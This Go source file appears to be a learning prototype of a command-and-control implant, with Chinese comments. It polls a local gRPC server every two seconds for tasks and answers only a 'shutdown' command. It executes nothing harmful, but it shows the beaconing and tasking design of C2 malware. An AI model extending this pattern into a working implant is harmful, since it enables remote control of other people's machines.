package main

import (
	pb "SimpleC2RpcTest/protobuf"
	"fmt"
	"io"
	"log"
	"google.golang.org/grpc"
	"context"
	"sync"
	"time"
)

// Address 连接地址
const Address string = ":8001"

var grpcImplant pb.ImplantServiceClient

type ImplantCommandRunResultStruct struct {
	command_chan chan *pb.ImplantRequestCommandInfo
	command_result_chan chan *pb.ImplantRunCommandResultInfo
}

func (i *ImplantCommandRunResultStruct)ImplantRequestCommand()  {
	req := pb.ImplantRequestCommandInfo{
		ImplantId: "implant_1",
		ClientId: "",
		CommandInfo: "",
	}

	stream, err := grpcImplant.ImplantRequestCommandService(context.Background())

	// 调用我们的服务(Route方法)
	// 同时传入了一个 context.Context ，在有需要时可以让我们改变RPC的行为，比如超时/取消一个正在运行的RPC
	err = stream.Send(&req)
	if err != nil {
		log.Fatalf("Call Route err: %v", err)
	}

	// 接收服务端响应
	resp, err := stream.Recv()
	if err == io.EOF {
		log.Println("Server closed the stream")
		return
	}
	if err != nil {
		log.Fatalf("Failed to receive message: %v", err)
	}
	log.Printf("Received from server: %s , %s , %s", resp.ImplantId,resp.ClientId,resp.CommandInfo)

	i.command_chan <- resp

	log.Println("pass")

	return
}

func (i *ImplantCommandRunResultStruct)HandleCommand() error {

	if len(i.command_chan) == 0{
		fmt.Println("no command to run")
		return nil
	}

	for will_run_command_info := range i.command_chan {
		command_str := will_run_command_info.CommandInfo
		implant_id := will_run_command_info.ImplantId
		client_id := will_run_command_info.ClientId

		if command_str == "shutdown"{

			//handle command
			fmt.Println("implant will handle shutdown and handle ok now........")

			return_str := fmt.Sprintf("%s have handle %s return to %s",implant_id,command_str,client_id)


			command_run_result := pb.ImplantRunCommandResultInfo{
				ImplantId: implant_id,
				ClientId: client_id,
				CommandRunResultInfo: return_str,
			}

			//发送执行结果
			res, err := grpcImplant.ImplantSendCommandResultService(context.Background(),&command_run_result)
			if err != nil {
				log.Fatalf("Call Route err: %v", err)
			}
			// 打印返回值
			log.Println(res)


			return nil

			//i.command_result_chan <- &command_run_result

		}else {
			fmt.Println("unknow command")
		}

		//fmt.Printf("Received command: %v", will_run_command_info)
	}
	return nil
}

////发送命令执行结果
//func (i *ImplantCommandRunResultStruct)SendCommandResult()  {
//
//	for command_result_info := range i.command_result_chan{
//		req := pb.ImplantRunCommandResultInfo{
//
//		}
//	}
//
//
//	req := pb.ClientSendCommandInfo{
//		ClientId:    "yxx2",
//		CommandInfo: "open",
//	}
//
//	// 调用我们的服务(Route方法)
//	// 同时传入了一个 context.Context ，在有需要时可以让我们改变RPC的行为，比如超时/取消一个正在运行的RPC
//	res, err := grpcClient.ClientSendCommandInfoService(context.Background(), &req)
//	if err != nil {
//		log.Fatalf("Call Route err: %v", err)
//	}
//	// 打印返回值
//	log.Println(res)
//}


func main()  {
	fmt.Println("hello implant")

	// 创建一个 ImplantCommandRunResult 实例
	implantCmdRunResultStruct := &ImplantCommandRunResultStruct{
		command_chan:   make(chan *pb.ImplantRequestCommandInfo,100),
		command_result_chan: make(chan *pb.ImplantRunCommandResultInfo,100),
	}


	// 连接服务器
	conn, err := grpc.Dial(Address, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("net.Connect err: %v", err)
	}
	defer conn.Close()

	// 建立gRPC连接
	grpcImplant = pb.NewImplantServiceClient(conn)


	var wg sync.WaitGroup
	wg.Add(1)

	stop := make(chan struct{})

	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		defer wg.Done()

		for {
			select {
			case <-ticker.C:
				fmt.Println("will requeset command.....")
				//ImplantRequestCommand()
				implantCmdRunResultStruct.ImplantRequestCommand()

				fmt.Println("handle command and return result")
				implantCmdRunResultStruct.HandleCommand()

			case <-stop:
				log.Println("Stopping goroutine")
				return
			}
		}
	}()

	wg.Wait()

	//ticker := time.NewTicker(2 * time.Second) // 每2秒触发一次
	//defer ticker.Stop()                       // 程序退出前停止ticker
	//
	//for range ticker.C {
	//	log.Fatalf("will requeset command.....")
	//	//ImplantRequestCommand()
	//}


	
}
